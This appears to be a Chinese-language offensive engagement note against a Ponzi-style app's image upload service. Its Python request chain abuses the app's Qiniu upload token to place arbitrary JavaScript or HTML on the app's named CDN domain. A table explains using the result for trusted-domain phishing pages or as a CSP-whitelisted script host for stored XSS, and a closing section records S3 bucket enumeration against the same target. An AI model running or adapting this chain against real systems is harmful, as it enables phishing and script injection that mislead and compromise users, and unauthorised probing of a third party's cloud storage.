# 上传 token → 可信 CDN 的 JS/HTML 宿主（Qiniu 实证，2026-10-21）

## 场景

资金盘/会员盘 App 的图片上传走自家 API 发 Qiniu token。token 的 policy 锁死 key（`scope: tpdivsjr:cart/20261021/<uuid>`），看起来只能传一张图。实际**内容与 MIME 由上传方决定**，CDN 原样回显。

## 请求链

```python
# 1. 取 token（Bearer 登录态）
r = requests.post(BASE + "/v1/blob/qiniu", headers={"Authorization": "Bearer " + TOK}, json={})
# -> {"fileUrl": "https://s3tpqiniu.jhnhac.cn/cart/20261021/<uuid>",
#     "host": "https://upload.qiniup.com",
#     "key": "cart/20261021/<uuid>",
#     "token": "AK:sign:base64url(policy)"}

# 2. 解 policy
parts = token.split(":")
policy = json.loads(base64.urlsafe_b64decode(parts[2] + "=" * (-len(parts[2]) % 4)))
# {"scope": "tpdivsjr:cart/20261021/<uuid>", "deadline": ...}

# 3. 上传任意内容：filename 与 Content-Type 自选
files = {"token": (None, token), "key": (None, key), "file": ("x.js", b"...js...", "application/javascript")}
r = requests.post(host, files=files)

# 4. 判定宿主能力
r2 = requests.get(file_url)
r2.headers.get("content-type")            # text/html / application/javascript
r2.headers.get("x-content-type-options")  # 缺失 = 无 nosniff
```

## 判读

| 回显 | 含义 |
|---|---|
| `text/html` + 无 nosniff | 可信域钓鱼页（同域图片 CDN，社工可信度高） |
| `application/javascript` + 无 nosniff | 可信域 JS 宿主：存储型 XSS 的外部 `<script src>` 可过 CSP 白名单 |
| `application/octet-stream` / 强制下载 | 只能当文件，无执行面 |
| 带 `nosniff` | `<script src>` 仍可按 JS 执行（经典脚本不看 nosniff 的同源限制？实测以浏览器为准），但 HTML 不渲染 |

## 限制

- key 服务端分配：不能覆盖已有对象（生产资源篡改不成立），但每次请求新 key = 无限托管。
- token 有 deadline（本例 1 小时）。
- 只解决托管，不解决投递；需要存储型 XSS、可发消息的真人通道或被诱导点击的管理员。

## 同轮 S3 桶枚举负结果

品牌词 × `-backup/-db/-data/-files/-prod/-2026` 等后缀，`?list-type=2` 三态分类，得到 `hcdb`(us-east-1)、`hcfiles`、`hcprod`(ap-east-1)、`kefu`(ap-east-1)、`kefu2026`，全部私有；`?acl` 仅 `hcprod` 回 200 且只有 `AllUsers READ_ACP`。`hcdb` 名字最像 DB 备份桶，但无 AWS 凭据 = 记账不突破。
